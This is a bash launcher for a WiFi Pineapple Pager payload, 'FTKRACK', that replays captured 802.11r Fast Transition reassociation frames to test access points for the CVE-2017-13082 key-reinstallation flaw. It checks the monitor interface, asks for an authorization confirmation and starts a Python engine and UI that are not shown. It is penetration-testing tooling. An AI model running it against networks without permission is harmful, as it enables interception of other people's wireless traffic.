#!/bin/bash
# Title: FTKRACK - 802.11r Fast Transition key reinstallation
# Author: sinXne0
# Description: Captures a valid 802.11r Fast Transition Reassociation Request, replays it verbatim to the target AP through the Pager's MT7921 monitor interface, and reports PTK/TK reinstallation only from observed evidence: a status-0 reassociation response after replay plus CCMP packet-number reuse/regression in AP data frames (CVE-2017-13082).
# Version: 1.0.0
# Category: user/interception
# Firmware: 2.0.0-stable or newer
# Requires: python3-light, MT7921 already in radiotap monitor mode (wlan1mon)
# Optional: none. No Mesh Mod, no extra hardware, no third-party Python packages.
#
# AUTHORIZED TESTING ONLY. Use only on an AP and client you own or have explicit
# written permission to test. Never point this at third-party networks.
#
# HARD CONSTRAINTS (state these before use):
#   - Firmware: Pager 2.0.0-stable+ with a real 480x222 display.
#   - Interface: the MT7921 must ALREADY be in radiotap monitor mode on
#     wlan1mon (ARPHRD 803). FTKRACK does NOT change interface mode and does
#     NOT start/stop hostapd, network-manager or the Pineapple services.
#     If the interface is missing or not monitor, the UI shows NO MONITOR and
#     no frames are captured or injected.
#   - Injection: arbitrary data-frame injection is not assumed. The only frame
#     transmitted is the captured 802.11 management frame, byte-for-byte. A
#     successful write is counted; a failed write is reported as a write error
#     and never as success.
#   - Scope: WPA2-PSK/Enterprise APs with 802.11r (FT) enabled and vulnerable
#     to CVE-2017-13082. WPA3-only, PMF-only (802.11w required), and APs that
#     implemented the FT replay-counter fix are out of scope and will simply
#     produce no proof.
#   - Passive capture cannot verify the FTIE MIC: the PTK is unknown to an
#     observer. A request is accepted for replay only if it is structurally
#     complete (MDIE + FTIE with non-zero MIC, SNonce and ANonce). Its
#     authenticity is tested by the AP's own reassociation response.
#   - No success is ever claimed from injection alone. PROOF CONFIRMED needs
#     all four: valid capture, accepted replay write, status-0 response after
#     replay, and observed CCMP PN reuse/regression.
#   - No live 802.11r AP/client and no Pager hardware were available during
#     development. All validation is hardware-free mocks; no real-world
#     success is claimed.
#
# LED States
#   Cyan     engine starting / monitor idle
#   Amber    capture or replay running
#   Green    proof CONFIRMED from observed response + PN reuse
#   Red      capability check failed / no monitor / error
#   Off      stopped
#
# Loot
#   /root/loot/ftkrack/ftkrack.log            engine/UI log
#   /root/loot/ftkrack/capture.json           observation snapshot
#   /root/loot/ftkrack/result.json            replay/response/PN/proof
#   /root/loot/ftkrack/reassoc-request.bin    captured FT request (802.11 bytes)

EXIT_CODE=0

# === PAYLOAD SDK STUBS ===
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]:-$0}")" 2>/dev/null && pwd)"
if ! command -v LOG          >/dev/null 2>&1; then LOG()          { echo "$*"; }; fi
if ! command -v LED          >/dev/null 2>&1; then LED()          { :; }; fi
if ! command -v ERROR_DIALOG >/dev/null 2>&1; then ERROR_DIALOG() { echo "ERROR: $*"; }; fi
if ! command -v CONFIRMATION_DIALOG >/dev/null 2>&1; then CONFIRMATION_DIALOG() { echo "${FTKRACK_CONFIRM:-true}"; }; fi

# === SELF-LOCATE ===
PAYLOAD_DIR=""
for candidate in "$SCRIPT_DIR" \
                 "${FTKRACK_PAYLOAD_DIR:-}" \
                 /root/payloads/user/*/ftkrack \
                 /mmc/root/payloads/user/*/ftkrack; do
    [ -n "$candidate" ] || continue
    if [ -f "$candidate/ftkrack.py" ]; then
        PAYLOAD_DIR="$candidate"
        break
    fi
done

if [ -z "$PAYLOAD_DIR" ]; then
    LED RED 2>/dev/null
    LOG "red" "ftkrack.py not found next to payload.sh"
    ERROR_DIALOG "FTKRACK files missing.\nRedeploy the payload folder."
    exit 1
fi

export PYTHONPATH="$PAYLOAD_DIR:$PAYLOAD_DIR/lib:${PYTHONPATH}"

STATE="${FTKRACK_STATE:-/tmp/ftkrack_state.json}"
CMD="${FTKRACK_CMD:-/tmp/ftkrack_cmd.jsonl}"
LOOT="${FTKRACK_LOOT:-/root/loot/ftkrack}"
export STATE CMD LOOT

LOG_FILE="$LOOT/ftkrack.log"
mkdir -p "$LOOT" /tmp
: > "$CMD"
rm -f "$STATE"

log(){ printf '%s %s\n' "$(date -u +%FT%TZ)" "$*" >> "$LOG_FILE" 2>/dev/null || true; }
die(){ FAIL "$*" 2>/dev/null || LOG "red" "$*"; log "FAIL $*"; LED R 255 0 0; EXIT_CODE=1; exit 1; }
FAIL(){ LOG "red" "$*"; }
INFO(){ LOG "cyan" "$*"; }
SUCCESS(){ LOG "green" "$*"; }

PYTHON="$(command -v python3 || true)"
[ -n "$PYTHON" ] || die "python3 not installed"
"$PYTHON" -c 'import sys; sys.exit(0 if sys.version_info >= (3,6) else 1)' 2>/dev/null || die "python3 >= 3.6 required"

# Capability check: stdlib protocol primitives must work before touching radio.
"$PYTHON" "$PAYLOAD_DIR/ftkrack.py" capcheck >>"$LOG_FILE" 2>&1 || die "capability check failed; see $LOG_FILE"

# Authorization gate -- explicit acceptance before any radio work.
CONFIRM="$(CONFIRMATION_DIALOG "FTKRACK replays an 802.11r FT reassociation frame to test CVE-2017-13082.\n\nAuthorized testing ONLY. Do not target third-party networks.\n\nContinue?" 2>/dev/null || true)"
case "$CONFIRM" in
  true|TRUE|yes|YES|A|a) ;;
  *) INFO "Authorization declined. Exiting."; exit 0 ;;
esac

INFO "FTKRACK starting"
log "start dir=$PAYLOAD_DIR"

# Verify the monitor interface before starting the processes. No mode changes.
IFACE="${FTKRACK_IFACE:-wlan1mon}"
if [ ! -e "/sys/class/net/$IFACE" ]; then
    die "NO MONITOR: $IFACE does not exist. Put the MT7921 in monitor mode first."
fi
IFTYPE="$(cat "/sys/class/net/$IFACE/type" 2>/dev/null || echo 0)"
if [ "$IFTYPE" != "803" ]; then
    die "NO MONITOR: $IFACE is not radiotap monitor (ARPHRD type=$IFTYPE, need 803)."
fi
log "monitor interface $IFACE verified (ARPHRD 803)"

# Stop the stock UI so both processes do not fight over the framebuffer.
# Remember whether it was running so cleanup can restore the operator's state.
PAGER_WAS_RUNNING=0
if command -v pineapplepager >/dev/null 2>&1; then
  /etc/init.d/pineapplepager status >/dev/null 2>&1 && PAGER_WAS_RUNNING=1
  /etc/init.d/pineapplepager stop >/dev/null 2>&1 || true
  killall pineapplepager >/dev/null 2>&1 || true
fi

cleanup(){
  trap - INT TERM EXIT
  INFO "stopping FTKRACK"
  log "stop"
  [ -n "$ENGINE_PID" ] && kill "$ENGINE_PID" >/dev/null 2>&1 || true
  [ -n "$UI_PID" ] && kill "$UI_PID" >/dev/null 2>&1 || true
  wait "$ENGINE_PID" >/dev/null 2>&1 || true
  wait "$UI_PID" >/dev/null 2>&1 || true
  rm -f "$STATE" "$CMD"
  if [ "$PAGER_WAS_RUNNING" -eq 1 ] && [ -x /etc/init.d/pineapplepager ]; then
    /etc/init.d/pineapplepager start >/dev/null 2>&1 || true
    log "stock pineapplepager UI restored"
  fi
  if [ "$EXIT_CODE" -eq 0 ]; then
    LED ALL OFF
  else
    LED R 255 0 0
  fi
  exit "$EXIT_CODE"
}
trap cleanup INT TERM EXIT

ENGINE_PID=""
UI_PID=""
LED C 0 180 255

"$PYTHON" "$PAYLOAD_DIR/ftkrack.py" engine >>"$LOG_FILE" 2>&1 &
ENGINE_PID=$!
sleep 0.4
kill -0 "$ENGINE_PID" 2>/dev/null || die "engine failed; see $LOG_FILE"

"$PYTHON" "$PAYLOAD_DIR/ft/ui.py" >>"$LOG_FILE" 2>&1 &
UI_PID=$!
sleep 0.4
kill -0 "$UI_PID" 2>/dev/null || die "UI failed; see $LOG_FILE"

SUCCESS "FTKRACK running. Authorize, lock target, SNIFF, REPLAY, then PROOF."
LED C 0 180 255

while true; do
  if ! kill -0 "$ENGINE_PID" 2>/dev/null; then
    die "engine exited unexpectedly; see $LOG_FILE"
  fi
  if ! kill -0 "$UI_PID" 2>/dev/null; then
    log "UI exited; stopping engine"
    break
  fi
  if [ -f "$STATE" ]; then
    if grep -q '"confirmed":true' "$STATE" 2>/dev/null; then
      LED 0 235 130 2>/dev/null || true
    elif grep -q '"phase":"sniff"' "$STATE" 2>/dev/null || \
         grep -q '"phase":"replay"' "$STATE" 2>/dev/null; then
      LED 255 176 32 2>/dev/null || true
    elif grep -q '"monitor":"none"' "$STATE" 2>/dev/null; then
      LED R 255 0 0 2>/dev/null || true
    fi
  fi
  sleep 0.5
done

cleanup
